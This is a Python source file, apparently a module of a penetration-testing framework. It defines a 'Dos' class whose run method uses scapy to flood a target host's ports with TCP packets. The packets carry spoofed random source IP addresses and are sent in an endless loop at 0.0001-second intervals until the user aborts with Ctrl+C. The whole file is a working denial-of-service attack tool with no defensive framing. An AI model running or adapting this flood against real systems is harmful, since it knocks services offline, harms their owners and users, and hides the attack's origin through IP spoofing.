import logging
# Disable warning IPv6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from jframework.modules.model import ModulePorts
from jframework.extras.check_scapy import check
import jframework.extras.writeformat as wf
import sys
try:
    from scapy.all import *
    conf.verb = 0
except:
    pass


class Dos(ModulePorts):

    def __init__(self):
        super(Dos, self).__init__()
        self.verb = False

    def conf(self):
        super(Dos, self).conf()
        if (self.verb):
            v = "True"
        else:
            v = "False"
        wf.printf("verbose", v, "Show info", "No")

    def verbose(self, v):
        if (v.lower() == "yes"):
            self.verb = True
        else:
            self.verb = False

    def get_options(self):
        options = super(Dos, self).get_options()
        options.extend(["verbose"])
        return options

    def help(self):
        super(Dos, self).help()
        print("verbose <YES/NO> -> show info when a module is running")

    def run(self):
        super(Dos, self).run()
        resp = check()
        if(resp != "ok"):
            print(resp)
            return

        print("CTRL+C to abort DoS")
        print("It's possible you need press it more than once")
        packet_number = 1
        try:
            while True:
                start = random.randint(1, 1000)
                end = start + 35
                rand_ip = RandIP()
                for srcport in range(start, end):
                    ip_packet = IP(src=rand_ip, dst=self.host)
                    tcp_packet = TCP(sport=RandShort(), dport=self.ports_list)
                    packet = ip_packet/tcp_packet
                    send(packet, inter=0.0001)
                    if(self.verb):
                        print("packet sent ", packet_number)
                        packet_number = packet_number + 1

        except KeyboardInterrupt:
            print("Aborted DoS")
            sys.exit(0)
        except Exception as e:
            print(e)